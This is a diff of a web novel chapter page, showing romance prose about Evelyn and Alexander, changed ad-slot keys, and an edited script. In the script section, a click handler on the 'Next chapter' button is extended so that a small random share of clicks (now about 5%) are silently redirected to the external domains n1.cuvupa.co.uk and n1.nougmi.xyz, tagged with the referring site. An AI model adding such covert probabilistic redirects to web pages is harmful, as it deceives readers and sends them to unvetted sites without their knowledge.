@@ -2405,7 +2405,7 @@
                 <p>Evelyn&#39;s mind was made up, and he owed her this respect.</p>
                 <p>&#34;Fine,&#34; he conceded through gritted teeth. &#34;If Claire&#39;s is where you want to be, so be it. But when I visit, you will see me. No avoiding me.&#34;</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>A faint, sad smile touched Evelyn&#39;s lips. &#34;Alexander, you&#39;re clever enough to understand that avoiding you is precisely why I&#39;m going to Claire&#39;s.&#34;</p>
                 <p>The words lanced through Alexander like a physical blow.</p>
                 <p>Some part of him had known this truth, but hearing it aloud left him breathless with pain.</p>
@@ -2415,7 +2415,7 @@
                 <p>Alexander&#39;s brow furrowed. &#34;Evelyn, what will it take to change your mind? You must know you mean more to me than Isabella ever could! If this is about her-&#34;</p>
                 <p>&#34;Are you certain?&#34; Evelyn interrupted, her gaze piercing. &#34;Truly certain I matter more than Isabella?&#34;</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>Alexander met her stare.</p>
                 <p>Though Evelyn looked at him, her focus seemed to extend beyond, as if seeing something distant.</p>
                 <p>&#34;I made myself clear that night. We&#39;re not right for each other anymore.&#34;</p>
@@ -2425,7 +2425,7 @@
                 <p>Evelyn lowered her head, tears threatening.</p>
                 <p>Her heart ached, but she&#39;d resolved that love shouldn&#39;t consume her entire existence.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
                 <p>Life held other treasures beyond romance.</p>
                 <p>She didn&#39;t regret loving Alexander - only that their marriage had reached its inevitable conclusion.</p>
                 <p>For years, she&#39;d lived constrained. Now, she contemplated the life she truly wanted.</p>
@@ -2435,7 +2435,7 @@
                 <p>&#34;Don&#39;t lie to yourself! You still love me - that&#39;s why you look so heartbroken!&#34;</p>
                 <p>Alexander pulled Evelyn into a crushing embrace, his voice thick. &#34;Don&#39;t do this. When Bella comes home, we&#39;ll be happy. Isabella means nothing to us. Don&#39;t throw us away!&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>Evelyn did feel regret.</p>
                 <p>But life overflowed with regrets.</p>
                 <p>Accepting reality was part of growing up.</p>
@@ -2447,7 +2447,7 @@
                 <p>He was shocked that kind-hearted Evelyn could suggest such cruelty. Their love had nothing to do with Isabella!</p>
                 <p>&#34;Evelyn, you...&#34; he stammered.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
             </div>
             
             <div class="font-controls">
@@ -2569,7 +2569,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2585,8 +2585,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
